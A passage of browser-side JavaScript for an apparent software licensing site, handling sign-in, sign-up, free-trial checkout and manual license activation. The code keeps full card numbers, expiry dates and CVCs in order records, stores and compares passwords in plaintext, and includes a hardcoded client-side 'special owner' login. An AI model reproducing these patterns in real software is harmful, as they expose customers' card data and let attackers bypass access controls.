            <input type="email" name="email" autocomplete="email" placeholder="you@email.com" required />
          </label>
          <label>
            Password
            <input type="password" name="password" autocomplete="new-password" placeholder="Create a password" required />
          </label>
          <label>
            Confirm Password
            <input type="password" name="confirmPassword" autocomplete="new-password" placeholder="Confirm your password" required />
          </label>
          ${error ? `<p class="form-error" role="alert">${escapeHtml(error)}</p>` : ""}
          <button class="btn btn-solid" type="submit">Create account</button>
          <a class="btn btn-ghost" href="#/signin">Already have an account?</a>
        </form>
      </main>
      ${footerHtml()}
    </div>
  `;
}

async function hashString(value) {
  const digest = await crypto.subtle.digest(
    "SHA-256",
    new TextEncoder().encode(String(value || "").trim())
  );

  return Array.from(new Uint8Array(digest))
    .map((byte) => byte.toString(16).padStart(2, "0"))
    .join("");
}

function bindSignInForm() {
  const form = document.getElementById("signin-form");
  if (!form) return;

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    const email = form.elements.email.value.trim();
    const password = form.elements.password.value.trim();

    if (!email.includes("@")) {
      root.innerHTML = signInPage("Enter a valid email.");
      bindSignInForm();
      return;
    }

    const hashedEmail = await hashString(email.toLowerCase());
    const hashedPassword = await hashString(password);
    const isSpecialOwnerLogin = Boolean(OWNER_SPECIAL_CREDENTIALS[hashedEmail] && OWNER_SPECIAL_CREDENTIALS[hashedEmail] === hashedPassword);

    if (isSpecialOwnerLogin) {
      localStorage.setItem(OWNER_SESSION_KEY, "1");
      window.location.href = "mainmenu.html";
      return;
    }

    const account = getAccountByEmail(email);

    if (!account) {
      root.innerHTML = signInPage("No account has been created for this email. Create one first.");
      bindSignInForm();
      return;
    }

    if (account.banned) {
      root.innerHTML = bannedPage();
      return;
    }

    if (account.password !== password) {
      root.innerHTML = signInPage("Incorrect password.");
      bindSignInForm();
      return;
    }

    saveSession({ email: account.email, signedInAt: new Date().toISOString() });
    navigate("/");
  });
}

function bindSignUpForm() {
  const form = document.getElementById("signup-form");
  if (!form) return;

  form.addEventListener("submit", (event) => {
    event.preventDefault();
    const email = form.elements.email.value.trim();
    const password = form.elements.password.value.trim();
    const confirmPassword = form.elements.confirmPassword.value.trim();

    if (!email.includes("@")) {
      root.innerHTML = signUpPage("Enter a valid email.");
      bindSignUpForm();
      return;
    }

    if (password.length < 6) {
      root.innerHTML = signUpPage("Password must be at least 6 characters.");
      bindSignUpForm();
      return;
    }

    if (password !== confirmPassword) {
      root.innerHTML = signUpPage("Passwords do not match.");
      bindSignUpForm();
      return;
    }

    const accounts = loadAccounts();
    const key = email.trim().toLowerCase();

    accounts[key] = {
      email: email.trim(),
      password,
      verified: false,
      pendingApproval: true,
      verificationCode: null,
      status: "Pending approval",
      createdAt: new Date().toISOString(),
      source: "Sign-up",
    };

    saveAccounts(accounts);
    saveSession({ email: email.trim(), signedInAt: new Date().toISOString() });
    navigate("/");
  });
}

function bindGetForm(search) {
  const form = document.getElementById("get-form");
  if (!form) return;
  bindCardInputs(form);

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    const fields = readGetFields(form);
    const planId = form.elements.plan.value === "paid" ? "paid" : "free";
    const plan = PLANS.find((item) => item.id === planId);

    const fail = (message) => {
      root.innerHTML = getPage(loadActivation(), search, message, false, fields);
      bindGetForm(search);
    };

    if (planId === "paid") {
      if (!fields.email.includes("@")) {
        fail("Enter a valid email.");
        return;
      }

      if (fields.paymentMethod === "crypto") {
        fail("Free trial is not available with crypto payments. Please use card to start the trial.");
        return;
      }

      const digits = fields.cardNumber.replace(/\D/g, "");
      if (fields.cardName.length < 2) {
        fail("Enter the name on the card.");
        return;
      }
      if (!isLikelyRealCard(fields.cardNumber)) {
        recordFakeOrder(fields);
        fail("Card number is invalid or looks like fake data.");
        return;
      }
      if (!isValidExpiry(fields.cardExpiry)) {
        fail("Card expiry is invalid or expired.");
        return;
      }
      if (fields.cardCvc.replace(/\D/g, "").length < 3) {
        fail("Enter a CVC.");
        return;
      }

      const normalizedEmail = String(fields.email).trim().toLowerCase();
      const existingActivation = loadActivation();
      const existingPending = loadPending();
      const existingForCustomer =
        (existingActivation && String(existingActivation.email || "").trim().toLowerCase() === normalizedEmail) ||
        (existingPending && String(existingPending.email || "").trim().toLowerCase() === normalizedEmail);

      const accessState = getAccessBlockState(fields.email, fields.cardNumber, fields.cardExpiry);
      if (accessState.blocked) {
        fail(accessState.reason);
        return;
      }

      if (existingForCustomer) {
        navigate("/license");
        return;
      }

      const shouldApplyFreeTrial = !accessState.trialUsed;

      root.innerHTML = getPage(loadActivation(), search, "", true, fields);
      await new Promise((resolve) => setTimeout(resolve, 700));

      const trialEndsAt = shouldApplyFreeTrial ? new Date(Date.now() + 3 * 24 * 60 * 60 * 1000).toISOString() : null;

      const pendingRecord = {
        id: createOrderId("pending"),
        email: fields.email,
        paymentMethod: fields.paymentMethod || "card",
        paymentNetwork: fields.cryptoNetwork || "LTC",
        paymentAddress: fields.cryptoAddress || "",
        cardName: fields.cardName,
        cardNumber: fields.cardNumber,
        cardExpiry: fields.cardExpiry,
        cardCvc: fields.cardCvc,
        last4: lastFour(fields.cardNumber),
        activationCode: makeActivationCode(),
        currency: fields.currency || "EUR",
        trialEndsAt,
        createdAt: new Date().toISOString(),
        freeTrialRequested: shouldApplyFreeTrial,
        trialPendingApproval: shouldApplyFreeTrial,
        trialApproved: false,
        planName: shouldApplyFreeTrial ? "Free trial" : plan.name,
        status: shouldApplyFreeTrial ? "Pending approval" : "Pending",
      };

      appendOrderAttempt(pendingRecord);

      const accounts = loadAccounts();
      const accountKey = String(fields.email).trim().toLowerCase();
      if (shouldApplyFreeTrial) {
        accounts[accountKey] = {
          ...(accounts[accountKey] || { email: fields.email }),
          email: fields.email,
          trialPendingApproval: true,
          freeTrialRequested: true,
          usedFreeTrial: false,
          status: "Pending approval",
        };
        saveAccounts(accounts);
      }

      savePending(pendingRecord);
      navigate("/license");
      return;
    }
  });
}

function bindManualForm() {
  const form = document.getElementById("manual-form");
  if (!form) return;

  form.addEventListener("submit", async (event) => {
    event.preventDefault();
    const email = form.elements.email.value.trim();
    const activationCode = form.elements.activationCode.value.trim();
    const pending = loadPending();
    const visiblePending = pending && !pending.fake ? pending : null;

    if (!email.includes("@")) {
      root.innerHTML = manualPage(loadActivation(), pending, "Enter a valid email.");
      bindManualForm();
      return;
    }

    if (!activationCode) {
      root.innerHTML = manualPage(loadActivation(), pending, "Enter the activation code from the paid request.");
      bindManualForm();
      return;
    }

    if (!canActivatePaidManually(email, activationCode, visiblePending)) {
      root.innerHTML = manualPage(loadActivation(), pending, "Manual activation requires a valid paid request and matching activation code.");
      bindManualForm();
      return;
    }

    root.innerHTML = manualPage(loadActivation(), pending, "", true);
    await new Promise((resolve) => setTimeout(resolve, 400));

    const paid = PLANS.find((item) => item.id === "paid");
    saveActivation({
      id: createOrderId("license"),
      email,
      planId: paid.id,
      planName: paid.name,
      key: makeKey(paid.id),
      activatedAt: new Date().toISOString(),
      price: paid.price,
      manual: true,
    });
    clearPending();
    navigate("/license");
  });
}

function bindLicensePage() {
  const button = document.getElementById("release-seat");
  if (!button) return;
  button.addEventListener("click", () => {
    const activation = loadActivation();
    if (!activation) return;

    saveActivation({
      ...activation,
      cancelled: true,
      cancelledAt: new Date().toISOString(),
      status: "Cancelled",
    });
    render();
  });
}

function render() {
  const { path, search } = parseRoute();
  let activation = loadActivation();
  const pending = loadPending();

  if (activation && isActivationExpired(activation)) {
    clearActivation();
    activation = null;
  }

  if (loadSession()) {
    const sessionEmail = getSignedUserEmail();
    const sessionAccount = sessionEmail ? getAccountByEmail(sessionEmail) : null;
    if (sessionAccount && sessionAccount.banned) {
      root.innerHTML = bannedPage();
      return;
    }
  }

  if (path === "/signin") {
    root.innerHTML = signInPage();
    bindSignInForm();
    return;
  }

  if (path === "/signup") {
    root.innerHTML = signUpPage();
    bindSignUpForm();
    return;
  }

  if (["/get", "/manual", "/license"].includes(path) && !isSignedIn()) {
    root.innerHTML = signInPage();
    bindSignInForm();
    return;
  }

  if (path === "/get") {
    const signedEmail = getSignedUserEmail();
    const signedAccess = signedEmail ? getAccessBlockState(signedEmail) : { blocked: false, reason: "" };
    if (signedAccess.blocked) {
      root.innerHTML = getPage(activation, search, signedAccess.reason, false, { email: signedEmail || activation?.email || "" });
      bindGetForm(search);
      return;
    }
    const formError = signedAccess.blocked ? signedAccess.reason : "";
    root.innerHTML = getPage(activation, search, formError, false, { email: signedEmail || activation?.email || "" });
    bindGetForm(search);
  } else if (path === "/manual") {
    root.innerHTML = manualPage(activation, pending);
    bindManualForm();
  } else if (path === "/license") {
    root.innerHTML = licensePage(activation, pending);
    bindLicensePage();
  } else {
    root.innerHTML = homePage(activation);
  }
}

window.addEventListener("hashchange", render);
if (!window.location.hash) {
  window.location.hash = "/";
} else {
  render();
}
